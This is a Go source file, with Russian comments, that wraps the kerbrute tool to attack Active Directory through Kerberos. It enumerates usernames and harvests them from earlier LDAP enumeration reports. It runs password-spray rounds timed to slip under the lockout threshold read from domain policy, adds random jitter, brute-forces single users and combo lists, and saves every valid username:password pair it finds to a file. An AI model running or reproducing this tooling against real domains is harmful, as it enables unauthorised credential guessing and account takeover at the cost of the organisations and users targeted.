// cmd/kerbrute — обёртка над kerbrute.
// Оставляем как было, только переводим на internal/cfg + logx.
// Парсеры — свои, kerbrute-специфичные.
package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"runner/internal/cfg"
	"runner/internal/logx"
)

type kerbruteConfig struct {
	Enabled          bool   `json:"enabled"`
	Mode             string `json:"mode"`
	UserList         string `json:"userlist"`
	PassList         string `json:"passlist"`
	ComboList        string `json:"combo_list"`
	Domain           string `json:"domain"`
	DC               string `json:"dc"`
	Threads          int    `json:"threads"`
	Timeout          int    `json:"timeout"`
	SafeMode         bool   `json:"safe_mode"`
	DelayMS          int    `json:"delay_ms"`
	JitterMS         int    `json:"jitter_ms"`
	LockoutThreshold int    `json:"lockout_threshold"`
	SprayPassword    string `json:"spray_password"`
	SprayPassFile    string `json:"spray_passwords_file"`
	ObservationMin   int    `json:"observation_window_min"`
}

type kerbCred struct {
	User     string `json:"user"`
	Password string `json:"password"`
	Domain   string `json:"domain"`
}

type sprayRound struct {
	Round       int    `json:"round"`
	Password    string `json:"password"`
	ValidCount  int    `json:"valid_count"`
	LockedCount int    `json:"locked_count"`
	Duration    string `json:"duration"`
}

type lockoutPolicy struct {
	Threshold         int    `json:"threshold"`
	ObservationWindow int    `json:"observation_window_min"`
	LockoutDuration   int    `json:"lockout_duration_min"`
	Source            string `json:"source"`
}

type kerbruteResult struct {
	Mode           string       `json:"mode"`
	DC             string       `json:"dc"`
	Domain         string       `json:"domain"`
	StartedAt      string       `json:"started_at"`
	FinishedAt     string       `json:"finished_at"`
	Duration       string       `json:"duration"`
	ValidUsers     []string     `json:"valid_users"`
	ValidCreds     []kerbCred   `json:"valid_credentials"`
	LockedOut      []string     `json:"locked_out"`
	TotalAttempts  int          `json:"total_attempts"`
	TotalUsers     int          `json:"total_users"`
	TotalPasswords int          `json:"total_passwords"`
	SprayRounds    []sprayRound `json:"spray_rounds,omitempty"`
	PolicyUsed     *lockoutPolicy `json:"lockout_policy_used,omitempty"`
	Errors         []string     `json:"errors"`
}

var (
	reValidUser = regexp.MustCompile(`VALID USERNAME:\s+(\S+@\S+)`)
	reValidCred = regexp.MustCompile(`VALID LOGIN:\s+(\S+)@(\S+)\s*:\s*(\S+)`)
	reLocked    = regexp.MustCompile(`(?i)(locked|LOCKED OUT).*?(\S+@\S+)`)
)

func findKerbrute() string {
	for _, c := range []string{"kerbrute", "/usr/local/bin/kerbrute", "/usr/bin/kerbrute", "/opt/kerbrute/kerbrute", "./kerbrute"} {
		if _, err := exec.LookPath(c); err == nil {
			return c
		}
	}
	return ""
}

func resolveDC(c kerbruteConfig) string {
	if c.DC != "" {
		return c.DC
	}
	if l := cfg.ReadLines("dns.txt"); len(l) > 0 {
		return strings.Split(l[0], ":")[0]
	}
	if l := cfg.ReadLines("nmap_ldap_hosts.txt"); len(l) > 0 {
		return l[0]
	}
	if l := cfg.ReadLines("ldap_ips.txt"); len(l) > 0 {
		return l[0]
	}
	return ""
}

func resolveDomain(c kerbruteConfig) string {
	if c.Domain != "" {
		return c.Domain
	}
	for _, f := range []string{"ldap_domains.txt", "smb_domains.txt", "domain.txt"} {
		if l := cfg.ReadLines(f); len(l) > 0 {
			return l[0]
		}
	}
	if ms, _ := filepath.Glob("ldap_enum_report_*.json"); len(ms) > 0 {
		if d, err := os.ReadFile(ms[0]); err == nil {
			var r struct {
				Domain string `json:"domain"`
			}
			if json.Unmarshal(d, &r) == nil && r.Domain != "" {
				return r.Domain
			}
		}
	}
	return ""
}

func autoUserList() []string {
	var users []string
	if ms, _ := filepath.Glob("ldap_enum_report_*.json"); len(ms) > 0 {
		if d, err := os.ReadFile(ms[0]); err == nil {
			var report struct {
				Queries map[string]struct {
					Entries []map[string]interface{} `json:"entries"`
				} `json:"queries"`
			}
			if json.Unmarshal(d, &report) == nil {
				if q, ok := report.Queries["all_users"]; ok {
					for _, e := range q.Entries {
						if sam, ok := e["sAMAccountName"].(string); ok && sam != "" {
							users = append(users, sam)
						}
					}
				}
			}
		}
	}
	for _, f := range []string{"domain_users.txt", "kerbrute_valid_users.txt"} {
		users = append(users, cfg.ReadLines(f)...)
	}
	return cfg.Uniq(users)
}

func loadPolicy(c kerbruteConfig) *lockoutPolicy {
	p := &lockoutPolicy{
		Threshold:         c.LockoutThreshold,
		ObservationWindow: c.ObservationMin,
		LockoutDuration:   c.ObservationMin,
		Source:            "manual",
	}
	if p.Threshold <= 0 {
		p.Threshold = 3
	}
	if p.ObservationWindow <= 0 {
		p.ObservationWindow = 30
	}
	if ms, _ := filepath.Glob("ldap_enum_report_*.json"); len(ms) > 0 {
		if d, err := os.ReadFile(ms[0]); err == nil {
			var report struct {
				Queries map[string]struct {
					Entries []map[string]interface{} `json:"entries"`
				} `json:"queries"`
			}
			if json.Unmarshal(d, &report) == nil {
				if q, ok := report.Queries["password_policy"]; ok && len(q.Entries) > 0 {
					if t, ok := q.Entries[0]["msDS-LockoutThreshold"]; ok {
						if ts, ok := t.(string); ok {
							if v, err := strconv.Atoi(ts); err == nil && v > 0 {
								p.Threshold = v
								p.Source = "ldap_enum"
							}
						}
					}
				}
			}
		}
	}
	return p
}

func runKerbrute(bin string, args []string, timeout int) (string, error) {
	logx.Info("cmd: %s %s", bin, strings.Join(args, " "))
	var buf bytes.Buffer
	cmd := exec.Command(bin, args...)
	cmd.Stdout = &buf
	cmd.Stderr = &buf
	done := make(chan error, 1)
	if err := cmd.Start(); err != nil {
		return "", fmt.Errorf("start: %v", err)
	}
	go func() { done <- cmd.Wait() }()
	to := time.Duration(timeout) * time.Minute
	if to <= 0 {
		to = 30 * time.Minute
	}
	select {
	case err := <-done:
		return buf.String(), err
	case <-time.After(to):
		cmd.Process.Kill()
		<-done
		return buf.String(), fmt.Errorf("timeout after %v", to)
	}
}

func parseOutput(out string) (users []string, creds []kerbCred, locked []string) {
	sc := bufio.NewScanner(strings.NewReader(out))
	seenU := map[string]bool{}
	seenC := map[string]bool{}
	seenL := map[string]bool{}
	for sc.Scan() {
		l := sc.Text()
		if m := reValidUser.FindStringSubmatch(l); len(m) > 1 {
			u := strings.Split(m[1], "@")[0]
			if !seenU[strings.ToLower(u)] {
				seenU[strings.ToLower(u)] = true
				users = append(users, u)
			}
		}
		if m := reValidCred.FindStringSubmatch(l); len(m) > 3 {
			k := strings.ToLower(m[1] + ":" + m[3])
			if !seenC[k] {
				seenC[k] = true
				creds = append(creds, kerbCred{m[1], m[3], m[2]})
			}
		}
		if m := reLocked.FindStringSubmatch(l); len(m) > 2 {
			u := strings.Split(m[2], "@")[0]
			if !seenL[strings.ToLower(u)] {
				seenL[strings.ToLower(u)] = true
				locked = append(locked, u)
			}
		}
	}
	return
}

func fileExists(p string) bool {
	_, err := os.Stat(p)
	return err == nil
}

func modeUserEnum(bin string, c kerbruteConfig, dc, dom string, r *kerbruteResult) {
	uf := c.UserList
	if uf == "" || !fileExists(uf) {
		users := autoUserList()
		if len(users) == 0 {
			logx.Err("no userlist")
			r.Errors = append(r.Errors, "no userlist")
			return
		}
		uf = "kerbrute_auto_userlist.txt"
		cfg.WriteLines(uf, users)
	}
	r.TotalUsers = len(cfg.ReadLines(uf))
	args := []string{"userenum", "--dc", dc, "--domain", dom, "-t", strconv.Itoa(c.Threads), "-o", "kerbrute_userenum.log"}
	if c.SafeMode {
		args = append(args, "--safe")
	}
	if c.DelayMS > 0 {
		args = append(args, "--delay", strconv.Itoa(c.DelayMS))
	}
	args = append(args, uf)
	out, err := runKerbrute(bin, args, c.Timeout)
	if err != nil {
		r.Errors = append(r.Errors, err.Error())
	}
	u, _, l := parseOutput(out)
	r.ValidUsers = u
	r.LockedOut = l
	r.TotalAttempts = r.TotalUsers
	logx.OK("valid users: %d / %d", len(u), r.TotalUsers)
}

func modeSpray(bin string, c kerbruteConfig, dc, dom string, r *kerbruteResult) {
	uf := c.UserList
	if uf == "" || !fileExists(uf) {
		if fileExists("kerbrute_valid_users.txt") {
			uf = "kerbrute_valid_users.txt"
		} else {
			users := autoUserList()
			if len(users) == 0 {
				logx.Err("no userlist")
				r.Errors = append(r.Errors, "no userlist")
				return
			}
			uf = "kerbrute_auto_userlist.txt"
			cfg.WriteLines(uf, users)
		}
	}
	r.TotalUsers = len(cfg.ReadLines(uf))

	var passwords []string
	if c.SprayPassword != "" {
		passwords = []string{c.SprayPassword}
	} else if c.SprayPassFile != "" && fileExists(c.SprayPassFile) {
		passwords = cfg.ReadLines(c.SprayPassFile)
	} else if c.PassList != "" && fileExists(c.PassList) {
		passwords = cfg.ReadLines(c.PassList)
	}
	if len(passwords) == 0 {
		logx.Err("no passwords")
		r.Errors = append(r.Errors, "no passwords")
		return
	}
	r.TotalPasswords = len(passwords)

	var pol *lockoutPolicy
	if c.SafeMode {
		pol = loadPolicy(c)
		r.PolicyUsed = pol
	}

	for i, pwd := range passwords {
		if c.SafeMode && pol != nil && i > 0 {
			lim := pol.Threshold - 2
			if lim < 1 {
				lim = 1
			}
			if i%lim == 0 {
				logx.Info("safe: wait %d min for lockout reset", pol.ObservationWindow)
				time.Sleep(time.Duration(pol.ObservationWindow) * time.Minute)
			}
		}
		logx.Info("spray %d/%d: pwd=%q on %d users", i+1, len(passwords), pwd, r.TotalUsers)
		rs := time.Now()
		args := []string{"passwordspray", "--dc", dc, "--domain", dom, "-t", strconv.Itoa(c.Threads), "-o", fmt.Sprintf("kerbrute_spray_%d.log", i+1)}
		if c.SafeMode {
			args = append(args, "--safe")
		}
		if c.DelayMS > 0 {
			args = append(args, "--delay", strconv.Itoa(c.DelayMS))
		}
		args = append(args, uf, pwd)
		out, err := runKerbrute(bin, args, c.Timeout)
		if err != nil {
			r.Errors = append(r.Errors, fmt.Sprintf("round %d: %v", i+1, err))
		}
		_, creds, locked := parseOutput(out)
		r.SprayRounds = append(r.SprayRounds, sprayRound{i + 1, pwd, len(creds), len(locked), time.Since(rs).Round(time.Millisecond).String()})
		r.TotalAttempts += r.TotalUsers
		for _, cc := range creds {
			r.ValidCreds = append(r.ValidCreds, cc)
			logx.OK("VALID: %s:%s", cc.User, cc.Password)
		}
		r.LockedOut = append(r.LockedOut, locked...)
		if len(locked) > 0 && c.SafeMode {
			logx.Warn("%d locked — stopping", len(locked))
			r.Errors = append(r.Errors, "stopped: lockout detected")
			break
		}
		if i < len(passwords)-1 && c.DelayMS > 0 {
			d := time.Duration(c.DelayMS)*time.Millisecond + time.Duration(rand.Intn(max(1, c.JitterMS)))*time.Millisecond
			time.Sleep(d)
		}
	}
	r.LockedOut = cfg.Uniq(r.LockedOut)
}

func modeBruteUser(bin string, c kerbruteConfig, dc, dom string, r *kerbruteResult) {
	pf := c.PassList
	if pf == "" || !fileExists(pf) {
		logx.Err("passlist required")
		r.Errors = append(r.Errors, "no passlist")
		return
	}
	r.TotalPasswords = len(cfg.ReadLines(pf))
	var tu []string
	if c.UserList != "" && fileExists(c.UserList) {
		tu = cfg.ReadLines(c.UserList)
	}
	if len(tu) == 0 {
		logx.Err("userlist required")
		r.Errors = append(r.Errors, "no userlist")
		return
	}
	r.TotalUsers = len(tu)
	for _, u := range tu {
		args := []string{"bruteuser", "--dc", dc, "--domain", dom, "-t", strconv.Itoa(c.Threads), "-o", fmt.Sprintf("kerbrute_bruteuser_%s.log", u)}
		if c.SafeMode {
			args = append(args, "--safe")
		}
		if c.DelayMS > 0 {
			args = append(args, "--delay", strconv.Itoa(c.DelayMS))
		}
		args = append(args, pf, u)
		out, err := runKerbrute(bin, args, c.Timeout)
		if err != nil {
			r.Errors = append(r.Errors, fmt.Sprintf("bruteuser %s: %v", u, err))
		}
		_, creds, locked := parseOutput(out)
		for _, cc := range creds {
			r.ValidCreds = append(r.ValidCreds, cc)
			logx.OK("VALID: %s:%s", cc.User, cc.Password)
		}
		r.LockedOut = append(r.LockedOut, locked...)
		r.TotalAttempts += r.TotalPasswords
		if len(locked) > 0 && c.SafeMode {
			logx.Warn("lockout — stopping")
			break
		}
	}
	r.LockedOut = cfg.Uniq(r.LockedOut)
}

func modeCombo(bin string, c kerbruteConfig, dc, dom string, r *kerbruteResult) {
	cf := c.ComboList
	if cf == "" || !fileExists(cf) {
		logx.Err("combo_list required")
		r.Errors = append(r.Errors, "no combo_list")
		return
	}
	r.TotalAttempts = len(cfg.ReadLines(cf))
	args := []string{"bruteforce", "--dc", dc, "--domain", dom, "-t", strconv.Itoa(c.Threads), "-o", "kerbrute_combo.log"}
	if c.SafeMode {
		args = append(args, "--safe")
	}
	if c.DelayMS > 0 {
		args = append(args, "--delay", strconv.Itoa(c.DelayMS))
	}
	args = append(args, cf)
	out, err := runKerbrute(bin, args, c.Timeout)
	if err != nil {
		r.Errors = append(r.Errors, fmt.Sprintf("combo: %v", err))
	}
	_, creds, locked := parseOutput(out)
	r.ValidCreds = append(r.ValidCreds, creds...)
	r.LockedOut = cfg.Uniq(locked)
}

func main() {
	fmt.Println("═══ Kerbrute v2.0 ═══")
	start := time.Now()

	c := kerbruteConfig{Mode: "userenum", Threads: 20, Timeout: 30, SafeMode: true, DelayMS: 100, JitterMS: 50, LockoutThreshold: 3, ObservationMin: 30}
	if d, err := os.ReadFile("job_config.json"); err == nil {
		var jc struct {
			Kerbrute kerbruteConfig `json:"kerbrute"`
		}
		if json.Unmarshal(d, &jc) == nil {
			k := jc.Kerbrute
			if k.Mode != "" {
				c.Mode = k.Mode
			}
			if k.UserList != "" {
				c.UserList = k.UserList
			}
			if k.PassList != "" {
				c.PassList = k.PassList
			}
			if k.ComboList != "" {
				c.ComboList = k.ComboList
			}
			if k.Domain != "" {
				c.Domain = k.Domain
			}
			if k.DC != "" {
				c.DC = k.DC
			}
			if k.Threads > 0 {
				c.Threads = k.Threads
			}
			if k.Timeout > 0 {
				c.Timeout = k.Timeout
			}
			c.SafeMode = k.SafeMode
			if k.DelayMS > 0 {
				c.DelayMS = k.DelayMS
			}
			if k.JitterMS > 0 {
				c.JitterMS = k.JitterMS
			}
			if k.LockoutThreshold > 0 {
				c.LockoutThreshold = k.LockoutThreshold
			}
			if k.SprayPassword != "" {
				c.SprayPassword = k.SprayPassword
			}
			if k.SprayPassFile != "" {
				c.SprayPassFile = k.SprayPassFile
			}
			if k.ObservationMin > 0 {
				c.ObservationMin = k.ObservationMin
			}
		}
	}

	bin := findKerbrute()
	if bin == "" {
		logx.Err("kerbrute binary not found")
		r := kerbruteResult{Errors: []string{"kerbrute not found"}}
		j, _ := json.MarshalIndent(r, "", "  ")
		os.WriteFile("kerbrute_results.json", j, 0644)
		os.Exit(1)
	}
	logx.OK("binary: %s", bin)

	dc := resolveDC(c)
	dom := resolveDomain(c)
	if dc == "" || dom == "" {
		logx.Err("no DC or domain (dc=%q dom=%q)", dc, dom)
		r := kerbruteResult{Errors: []string{"no dc/domain"}}
		j, _ := json.MarshalIndent(r, "", "  ")
		os.WriteFile("kerbrute_results.json", j, 0644)
		os.Exit(1)
	}
	logx.Info("DC: %s | Domain: %s | Mode: %s | Threads: %d | SafeMode: %v", dc, dom, c.Mode, c.Threads, c.SafeMode)

	r := kerbruteResult{Mode: c.Mode, DC: dc, Domain: dom, StartedAt: start.Format(time.RFC3339), Errors: []string{}}

	switch c.Mode {
	case "userenum":
		modeUserEnum(bin, c, dc, dom, &r)
	case "spray":
		modeSpray(bin, c, dc, dom, &r)
	case "bruteuser":
		modeBruteUser(bin, c, dc, dom, &r)
	case "combo":
		modeCombo(bin, c, dc, dom, &r)
	default:
		logx.Err("unknown mode: %s", c.Mode)
		r.Errors = append(r.Errors, "unknown mode")
	}

	r.FinishedAt = time.Now().Format(time.RFC3339)
	r.Duration = time.Since(start).Round(time.Millisecond).String()
	if r.ValidUsers == nil {
		r.ValidUsers = []string{}
	}
	if r.ValidCreds == nil {
		r.ValidCreds = []kerbCred{}
	}
	if r.LockedOut == nil {
		r.LockedOut = []string{}
	}

	j, _ := json.MarshalIndent(r, "", "  ")
	os.WriteFile("kerbrute_results.json", j, 0644)
	if len(r.ValidUsers) > 0 {
		cfg.WriteLines("kerbrute_valid_users.txt", r.ValidUsers)
	}
	if len(r.ValidCreds) > 0 {
		var lines []string
		for _, cc := range r.ValidCreds {
			lines = append(lines, fmt.Sprintf("%s:%s", cc.User, cc.Password))
		}
		cfg.WriteLines("kerbrute_valid_creds.txt", lines)
	}
	logx.OK("done in %s — users:%d creds:%d locked:%d", r.Duration, len(r.ValidUsers), len(r.ValidCreds), len(r.LockedOut))
}